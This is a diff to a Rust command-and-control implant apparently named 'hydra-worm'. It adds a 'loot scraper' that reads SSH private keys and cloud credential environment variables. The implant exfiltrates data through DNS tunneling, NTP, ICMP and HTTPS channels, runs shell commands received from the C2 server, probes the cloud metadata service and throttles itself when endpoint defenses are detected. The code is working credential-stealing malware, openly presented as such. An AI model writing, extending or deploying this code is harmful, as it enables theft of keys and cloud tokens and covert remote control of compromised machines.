@@ -15,6 +15,37 @@ use pnet::packet::icmp::echo_request::MutableEchoRequestPacket;
 use pnet::packet::icmp::IcmpTypes; 
 use pnet::packet::Packet;
 
+// --- PHASE 3.3: TACTICAL LOOT SCRAPER ---
+// This module handles the automated exfiltration of high-value credentials
+struct LootScraper;
+
+impl LootScraper {
+    fn harvest(username: &str) -> Option<String> {
+        // Strategy 1: Hunt for SSH Private Keys (Tactical target)
+        let ssh_path = if username == "root" {
+            "/root/.ssh/id_rsa".to_string()
+        } else {
+            format!("/home/{}/.ssh/id_rsa", username)
+        };
+
+        if let Ok(content) = std::fs::read_to_string(&ssh_path) {
+            // Grab the first line of the key to signal success to the Vault
+            let key_hint = content.lines().next().unwrap_or("DATA_HIDDEN");
+            return Some(format!("LOOT:SSH:{} (Path: {})", key_hint, ssh_path));
+        }
+
+        // Strategy 2: Hunt for Cloud/Deployment Tokens in Env Vars
+        let cloud_vars = ["AWS_ACCESS_KEY_ID", "AZURE_CLIENT_ID", "KUBECONFIG"];
+        for var in cloud_vars.iter() {
+            if let Ok(val) = std::env::var(var) {
+                return Some(format!("LOOT:ENV:{}={}", var, val));
+            }
+        }
+
+        None
+    }
+}
+
 #[derive(Serialize, Clone)]
 struct Telemetry {
     #[serde(rename = "a")] agent_id: String, 
@@ -79,20 +110,15 @@ trait Transport {
     fn get_name(&self) -> String;
 }
 
-// --- TRANSPORT TIER 6: DNS TUNNELING (FIXED FOR DIRECT UDP) ---
-
-// --- TRANSPORT TIER 6: DNS TUNNELING (FIXED) ---
-
+// --- TRANSPORT TIER 6: DNS TUNNELING (RFC 1035 HARDENED) ---
 struct DnsTransport { 
     root_domain: String,
     target_addr: String, // Dynamic target
 }
 
-// --- TRANSPORT TIER 6: DNS TUNNELING (RFC 1035 HARDENED) ---
 impl Transport for DnsTransport {
     fn send_heartbeat(&self, stats: &Telemetry) -> Result<C2Response, String> {
         // 1. TACTICAL TRIMMING: DNS names cannot exceed 255 total bytes.
-        // We must truncate the bash history to fit.
         let mut stats_min = stats.clone();
         if stats_min.artifact_preview.len() > 32 {
             stats_min.artifact_preview = format!("{}...", &stats_min.artifact_preview[..29]);
@@ -100,7 +126,7 @@ impl Transport for DnsTransport {
 
         let json_data = serde_json::to_string(&stats_min).map_err(|e| e.to_string())?;
         
-        // 2. URL-Safe Encoding (matches Go side)
+        // 2. URL-Safe Encoding
         let encoded = general_purpose::URL_SAFE_NO_PAD.encode(json_data);
         
         let mut packet = Vec::new();
@@ -114,18 +140,15 @@ impl Transport for DnsTransport {
         }
 
         // 4. ENCODE ROOT DOMAIN: "c2.hydra-worm.local"
-        // We split by '.' to ensure each part is treated as a distinct DNS label
         for part in self.root_domain.split('.') {
             if part.is_empty() { continue; }
             packet.push(part.len() as u8);
             packet.extend_from_slice(part.as_bytes());
         }
         
-        // Null terminator (End of Name) + Type A + Class IN
         packet.push(0); 
         packet.extend_from_slice(&[0x00, 0x01, 0x00, 0x01]);
 
-        // 5. DISPATCH & AWAIT ACK
         let socket = UdpSocket::bind("0.0.0.0:0").map_err(|e| e.to_string())?;
         socket.set_read_timeout(Some(Duration::from_secs(2))).map_err(|e| e.to_string())?;
         
@@ -142,10 +165,7 @@ impl Transport for DnsTransport {
 }
 
 // --- TRANSPORT TIER 5: NTP SIGNALING ---
-
-struct NtpTransport { 
-    pool_addr: String 
-}
+struct NtpTransport { pool_addr: String }
 
 impl Transport for NtpTransport {
     fn send_heartbeat(&self, stats: &Telemetry) -> Result<C2Response, String> {
@@ -164,7 +184,6 @@ impl Transport for NtpTransport {
         let mut buf = [0u8; 1024];
         let (amt, _) = socket.recv_from(&mut buf).map_err(|e| e.to_string())?;
         
-        // C2 must respond with "T-ACK" after the 48th byte
         if amt >= 48 && &buf[48..53] == b"T-ACK" {
             Ok(C2Response { status: "ntp_synced".into(), task: "WAIT".into(), epoch: 0 })
         } else {
@@ -172,21 +191,17 @@ impl Transport for NtpTransport {
         }
     }
 
-    fn get_name(&self) -> String { "NTP-Signaling".into() } // <--- COMPLIANCE FIX
+    fn get_name(&self) -> String { "NTP-Signaling".into() }
 }
 
 // --- TRANSPORT TIER 4: ICMP FAILSAFE ---
-
-struct IcmpTransport { 
-    target_ip: std::net::Ipv4Addr 
-}
+struct IcmpTransport { target_ip: std::net::Ipv4Addr }
 
 impl Transport for IcmpTransport {
     fn send_heartbeat(&self, stats: &Telemetry) -> Result<C2Response, String> {
         let json_data = serde_json::to_string(stats).map_err(|e| e.to_string())?;
         let encoded = general_purpose::URL_SAFE_NO_PAD.encode(json_data);
         
-        // 1. Build & Send (Short & Fast)
         let mut buffer = vec![0u8; 8 + encoded.len()];
         let mut packet = MutableEchoRequestPacket::new(&mut buffer).unwrap();
         packet.set_icmp_type(IcmpTypes::EchoRequest);
@@ -199,32 +214,24 @@ impl Transport for IcmpTransport {
 
         tx.send_to(packet, std::net::IpAddr::V4(self.target_ip)).map_err(|e| e.to_string())?;
 
-        // 2. Strict Receiver with Resurrection Check
         let mut rx_iter = pnet::transport::icmp_packet_iter(&mut rx);
         
-        // Increased timeout to 2s for "hibernating" stability
         match rx_iter.next_with_timeout(Duration::from_millis(2000)) {
             Ok(Some((packet, addr))) if addr == std::net::IpAddr::V4(self.target_ip) => {
                 let rx_payload = packet.payload();
                 
-                // RESURRECTION CHECK: Look for the specific 'WAKE' signature
                 if rx_payload.len() >= 14 && &rx_payload[4..14] == b"HYDRA_WAKE" {
-                    println!("[!] ZOMBIE SIGNAL: Resurrection command received. Re-engaging primary systems.");
+                    println!("[!] ZOMBIE SIGNAL: Resurrection command received.");
                     return Ok(C2Response { status: "resurrected".into(), task: "RESUME".into(), epoch: 1 });
                 }
 
-                // STANDARD ACK: Stay in Zombie Loop (Tier 4)
                 if rx_payload.len() >= 13 && &rx_payload[4..13] == b"HYDRA_ACK" {
                     return Ok(C2Response { status: "icmp_ack_verified".into(), task: "SLEEP".into(), epoch: 0 });
                 }
                 
-                println!("[-] Signature mismatch! Likely Kernel Ping.");
                 Err("SIG_FAIL".into())
             },
-            _ => {
-                println!("[-] No valid C2 response detected.");
-                Err("OFFLINE".into())
-            }
+            _ => Err("OFFLINE".into())
         }
     }
 
@@ -232,10 +239,7 @@ impl Transport for IcmpTransport {
 }
 
 // --- TRANSPORT TIER 2: MALLEABLE HTTPS ---
-
-struct MalleableHttps { 
-    c2_url: String 
-}
+struct MalleableHttps { c2_url: String }
 
 impl Transport for MalleableHttps {
     fn send_heartbeat(&self, stats: &Telemetry) -> Result<C2Response, String> {
@@ -256,7 +260,6 @@ impl Transport for MalleableHttps {
 
         if response.status().is_success() {
             let body: C2Response = response.json().map_err(|e: reqwest::Error| e.to_string())?;
-            println!("[+] Malleable Success | Profile: [UA: {}] [Key: {}]", profile.user_agent, profile.hydra_key);
             Ok(body)
         } else {
             Err(format!("HTTP Error: {}", response.status()))
@@ -293,7 +296,6 @@ struct CloudTransport { endpoint: String }
 impl Transport for CloudTransport {
     fn send_heartbeat(&self, stats: &Telemetry) -> Result<C2Response, String> {
         let client = reqwest::blocking::Client::new();
-        // Target internal lab for mock testing
         let res = client.post(&self.endpoint)
             .header("Authorization", "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9") 
             .json(stats)
@@ -306,14 +308,12 @@ impl Transport for CloudTransport {
             Err(format!("Cloud API Error: {}", res.status()))
         }
     }
-
-    fn get_name(&self) -> String { "Azure-Graph-Mock".into() } // <--- COMPLIANCE FIX
+    fn get_name(&self) -> String { "Azure-Graph-Mock".into() }
 }
 
 struct P2PTransport;
 impl Transport for P2PTransport {
     fn send_heartbeat(&self, _stats: &Telemetry) -> Result<C2Response, String> {
-        println!("[!] C2-P2P: Broadcasting to local mesh...");
         Err("Tier 3 - Mesh discovery active".into())
     }
     fn get_name(&self) -> String { "P2P-Gossip-Mesh".into() }
@@ -329,17 +329,13 @@ struct Agent {
 }
 
 fn detect_env() -> String {
-    // Check for Docker
     if std::path::Path::new("/.dockerenv").exists() {
         return "Docker-Container".into();
     }
-
-    // Check for Cloud IMDS (AWS/GCP/OpenStack)
     let client = reqwest::blocking::Client::builder()
-        .timeout(Duration::from_millis(300)) // Fast timeout to avoid lag
+        .timeout(Duration::from_millis(300))
         .build()
         .unwrap_or_default();
-
     match client.get("http://169.254.169.254/latest/meta-data/instance-id").send() {
         Ok(_) => "Cloud-Instance".into(),
         Err(_) => "Bare-Metal/VM".into(),
@@ -364,7 +360,6 @@ impl Agent {
     fn run(&mut self) {
         let mut sys = System::new_all();
         sys.refresh_all();
-        
         let hostname = System::host_name().unwrap_or_else(|| "unknown_host".into());
         let user_list = sysinfo::Users::new_with_refreshed_list();
         let current_pid = sysinfo::get_current_pid().unwrap();
@@ -381,17 +376,18 @@ impl Agent {
         let env_ctx = detect_env();
 
         loop {
-            // TACTICAL FIX: Prioritize command results over standard bash history
+            // PHASE 3.3 PRIORITY: 1. Exec Output, 2. Loot (SSH/ENV), 3. Recon (Bash History)
             let artifact_data = if !self.last_command_output.is_empty() {
                 let out = self.last_command_output.clone();
-                self.last_command_output.clear(); // Clear buffer after preparing exfiltration
+                self.last_command_output.clear();
                 out
+            } else if let Some(loot) = LootScraper::harvest(&username) {
+                loot
             } else {
                 harvest_bash_history(&username)
             };
 
             let defense_ctx = profile_defenses(); 
-
             let stats = Telemetry {
                 agent_id: self.id.clone(),
                 transport: self.transport.get_name(),
@@ -410,10 +406,7 @@ impl Agent {
                     println!("[+] C2 Status: {} | Defense: {} | Activity: {}", res.status, stats.defense_profile, stats.artifact_preview);
                     self.failures = 0;
 
-                    // --- PHASE 3.1 & 3.2: MISSION OBJECTIVE EXECUTION & CAPTURE ---
                     if res.task != "WAIT" && res.task != "NOP" && res.task != "SLEEP" && !res.task.is_empty() {
-                        println!("[!] MISSION OBJECTIVE RECEIVED: {}", res.task);
-                        
                         let output = if cfg!(target_os = "windows") {
                             Command::new("cmd").args(["/C", &res.task]).output()
                         } else {
@@ -424,18 +417,14 @@ impl Agent {
                             Ok(out) => {
                                 let stdout = String::from_utf8_lossy(&out.stdout).trim().to_string();
                                 let stderr = String::from_utf8_lossy(&out.stderr).trim().to_string();
-                                
-                                // Format with OUT: prefix for C2 parser
                                 if !stdout.is_empty() {
                                     self.last_command_output = format!("OUT:{}", stdout);
-                                    println!("[+] STDOUT captured for exfiltration.");
                                 } else if !stderr.is_empty() {
                                     self.last_command_output = format!("OUT:ERR: {}", stderr);
                                 }
                             }
                             Err(e) => {
                                 self.last_command_output = format!("OUT:EXEC_FAIL: {}", e);
-                                println!("[-] Execution Failed: {}", e);
                             }
                         }
                     }
@@ -443,7 +432,6 @@ impl Agent {
                 Err(e) => {
                     println!("[-] Failure ({}): {}", self.transport.get_name(), e);
                     self.failures += 1;
-
                     if self.transport.get_name() == "ICMP-Failsafe" || self.failures >= 3 {
                         self.mutate();
                         continue; 
@@ -453,14 +441,9 @@ impl Agent {
 
             if self.failures >= 3 { self.mutate(); }
             
-            // Adaptive heartbeat logic based on EDR presence
             let mut rng = rand::thread_rng();
             let mut current_lambda = self.lambda;
-
-            if stats.defense_profile != "None" {
-                current_lambda /= 2.0; 
-                println!("[!] EDR Detected: Throttling traffic.");
-            }
+            if stats.defense_profile != "None" { current_lambda /= 2.0; }
 
             let exp = Exp::new(current_lambda).unwrap();
             let max_sleep = if stats.defense_profile != "None" { 300.0 } else { 60.0 };
@@ -513,7 +496,7 @@ fn display_splash() {
   |__/|__/\____/_/ .__/_/ /_/ /_/                 
                 /_/                              
     "#);
-    println!("      [ Phase 2.2 Artifact Harvesting: Parsing known_hosts and bash_history.]\n");
+    println!("      [ Phase 3.3: Credential Management - Looting Vault Engaged ]\n");
 }
 
 fn main() {
